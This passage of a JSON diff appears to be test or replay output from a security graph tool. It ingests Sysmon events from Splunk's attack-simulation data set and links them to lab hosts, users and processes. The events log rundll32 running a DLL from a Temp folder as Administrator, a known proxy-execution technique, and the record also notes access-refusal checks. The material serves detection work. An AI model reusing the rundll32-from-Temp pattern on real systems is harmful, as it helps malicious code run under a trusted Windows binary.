+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+            "label": "Identity",
+            "name": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+            "event_count": 2,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+            "label": "Process",
+            "name": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+            "event_count": 2,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "observation_roles": [
+                "parent_field_reference"
+              ],
+              "process_guid": "e4b49a97-9749-6888-5a01-00000000f103",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+            "label": "Event",
+            "name": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+            "label": "Process",
+            "name": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "observation_roles": [
+                "process_creation"
+              ],
+              "process_guid": "e4b49a97-9761-6888-5c01-00000000f103",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          }
+        ],
+        "edges": [
+          {
+            "id": "edge-21899a05a0b6b23678fba60020129de8900a62bae140eacedc342d86e88cd30f",
+            "label": "PROCESS_ON_HOST",
+            "kind": "event",
+            "from": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+            "to": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "event_count": 2,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-cc73f1fbc503a9dbc079cb2d7eda24474673a516e99644b69444d6844804164c",
+            "label": "PARENT_OF",
+            "kind": "event",
+            "from": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+            "to": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-92c9e8a5cc869612517a014c0a67be4943520b8e5cdeb54f2d3a9d97f080ab3b",
+            "label": "EVIDENCES_ENTITY",
+            "kind": "event",
+            "from": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+            "to": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-e662d42ad3bec479d62f01889f7dc43494598ed0a2c37fbca21e9fc08f142ef8",
+            "label": "EVIDENCES_ENTITY",
+            "kind": "event",
+            "from": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+            "to": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-84f72a6d368b792b2c652a9b7eab4385963a203ff4cf9437182992e36e74cd17",
+            "label": "EVIDENCES_ENTITY",
+            "kind": "event",
+            "from": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+            "to": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-e8acb29c4a64835dea476f4fe10d477ecad96c4904051e0a32c85c941813d01f",
+            "label": "PROCESS_ON_HOST",
+            "kind": "event",
+            "from": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+            "to": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-4ad5b0442580897b583035d6407b3ac29508404352d2277d3a2e97ebc4562ea2",
+            "label": "EXECUTED_AS",
+            "kind": "event",
+            "from": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+            "to": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          }
+        ],
+        "historical_replay": true,
+        "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+        "source": {
+          "source_id": "splunk-attack-data",
+          "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+          "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+          "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+          "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+          "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+        },
+        "window": {
+          "start": "",
+          "end": "",
+          "bucket_minutes": 0
+        },
+        "selected": [
+          "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0"
+        ],
+        "shared": [],
+        "depth": 1,
+        "scope": "all",
+        "focus": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0"
+      }
+    }
+  },
+  "refusals": [
+    {
+      "check": "foreign-partition",
+      "status": 422,
+      "expected": 422
+    },
+    {
+      "check": "anonymous",
+      "status": 401,
+      "expected": 401
+    }
+  ],
+  "failures": [],
+  "classification": "live signed GET readbacks for development replay; no full live candidate acceptance",
+  "local_source": {
+    "manifest_sha256": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+    "events": [
+      {
+        "byte_length": 2037,
+        "byte_offset": 0,
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "entity_refs": {
+          "domain": "domain-73df6c5637b12af4763beae5acef599d562063dba69aaba4379e93be509c88e3",
+          "host": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+          "parent_process": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+          "process": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+          "user": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813"
+        },
+        "event_id": "1",
+        "event_record_id": "62359",
+        "fields": {
+          "CommandLine": "rundll32.exe  C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\tmp12345.dll,MessageBoxThread",
+          "Company": "Microsoft Corporation",
+          "CurrentDirectory": "C:\\Temp\\test\\",
+          "Description": "Windows host process (Rundll32)",
+          "FileVersion": "10.0.14393.4169 (rs1_release.210107-1130)",
+          "Hashes": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
+          "Image": "C:\\Windows\\System32\\rundll32.exe",
+          "IntegrityLevel": "High",
+          "LogonGuid": "{E4B49A97-9495-6888-9179-410000000000}",
+          "LogonId": "0x417991",
+          "OriginalFileName": "RUNDLL32.EXE",
+          "ParentCommandLine": "\"cmd.exe\" /s /k pushd \"C:\\Temp\\test\"",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentProcessGuid": "{E4B49A97-9749-6888-5A01-00000000F103}",
+          "ParentProcessId": "6124",
+          "ParentUser": "ATTACKRANGE\\Administrator",
+          "ProcessGuid": "{E4B49A97-9768-6888-5F01-00000000F103}",
+          "ProcessId": "5668",
+          "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+          "RuleName": "-",
+          "TerminalSessionId": "2",
+          "User": "ATTACKRANGE\\Administrator",
+          "UtcTime": "2025-07-29 09:42:00.174"
+        },
+        "host": "ar-win-dc.attackrange.local",
+        "id": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+        "kind": "event",
+        "label_status": "unlabelled",
+        "ordinal": 1,
+        "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+        "provider": "Microsoft-Windows-Sysmon",
+        "raw_sha256": "eb01dc7db07099b26375cb1ca052229c7b73afea5179d06a97514d59b094b3ac",
+        "resource_id": "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+        "source": {
+          "byte_length": 2037,
+          "byte_offset": 0,
+          "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+          "ordinal": 1,
+          "raw_sha256": "eb01dc7db07099b26375cb1ca052229c7b73afea5179d06a97514d59b094b3ac",
+          "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+          "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+          "source_id": "splunk-attack-data",
+          "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+          "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+        },
+        "timestamp": "2025-07-29T09:42:00.175712200Z",
+        "transform_version": "public-windows-v1"
+      },
+      {
+        "byte_length": 2020,
+        "byte_offset": 2037,
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "entity_refs": {
+          "domain": "domain-73df6c5637b12af4763beae5acef599d562063dba69aaba4379e93be509c88e3",
+          "host": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+          "parent_process": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+          "process": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+          "user": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813"
+        },
+        "event_id": "1",
+        "event_record_id": "62302",
+        "fields": {
+          "CommandLine": "rundll32.exe  C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\tmp12345.dll",
+          "Company": "Microsoft Corporation",
+          "CurrentDirectory": "C:\\Temp\\test\\",
+          "Description": "Windows host process (Rundll32)",
+          "FileVersion": "10.0.14393.4169 (rs1_release.210107-1130)",
+          "Hashes": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
+          "Image": "C:\\Windows\\System32\\rundll32.exe",
+          "IntegrityLevel": "High",
+          "LogonGuid": "{E4B49A97-9495-6888-9179-410000000000}",
+          "LogonId": "0x417991",
+          "OriginalFileName": "RUNDLL32.EXE",
+          "ParentCommandLine": "\"cmd.exe\" /s /k pushd \"C:\\Temp\\test\"",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentProcessGuid": "{E4B49A97-9749-6888-5A01-00000000F103}",
+          "ParentProcessId": "6124",
+          "ParentUser": "ATTACKRANGE\\Administrator",
+          "ProcessGuid": "{E4B49A97-9761-6888-5C01-00000000F103}",
+          "ProcessId": "1612",
+          "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+          "RuleName": "-",
+          "TerminalSessionId": "2",
+          "User": "ATTACKRANGE\\Administrator",
+          "UtcTime": "2025-07-29 09:41:53.533"
+        },
+        "host": "ar-win-dc.attackrange.local",
+        "id": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+        "kind": "event",
+        "label_status": "unlabelled",
+        "ordinal": 2,
+        "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+        "provider": "Microsoft-Windows-Sysmon",
+        "raw_sha256": "f3ab0028793c1937b47413e99f83e92710c7e747806e927d2f1e6aba67a0c57d",
+        "resource_id": "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2",
+        "source": {
+          "byte_length": 2020,
+          "byte_offset": 2037,
+          "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+          "ordinal": 2,
+          "raw_sha256": "f3ab0028793c1937b47413e99f83e92710c7e747806e927d2f1e6aba67a0c57d",
+          "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+          "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+          "source_id": "splunk-attack-data",
+          "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+          "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+        },
+        "timestamp": "2025-07-29T09:41:53.534035800Z",
+        "transform_version": "public-windows-v1"
+      }
+    ],
+    "graph": {
+      "edges": [
+        {
+          "from_id": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+          "id": "edge-b9a04ef6c97813a59750119d7672f61457ddb450ff3cc58c4e7312148dcba394",
+          "label": "EVIDENCES_ENTITY",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e"
+        },
+        {
+          "from_id": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+          "id": "edge-c3e11b45801292a7a613a1d4b2dcc531bb7e8e9c499243d0a39f536865241fcc",
+          "label": "MEMBER_OF_DOMAIN",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
+              "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+              "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+              "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+              "source_id": "splunk-attack-data",
+              "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+              "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+            }
+          },
+          "to_id": "domain-73df6c5637b12af4763beae5acef599d562063dba69aaba4379e93be509c88e3"
+        },
+        {
+          "from_id": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+          "id": "edge-ef524b676434ba0cd6e6637efa43183900494d522e37bcf0ce5f392e7a42f525",
+          "label": "EVIDENCES_ENTITY",
+          "properties": {
+            "evidence_refs": [
+              "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+            ],
+            "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+            "source": {
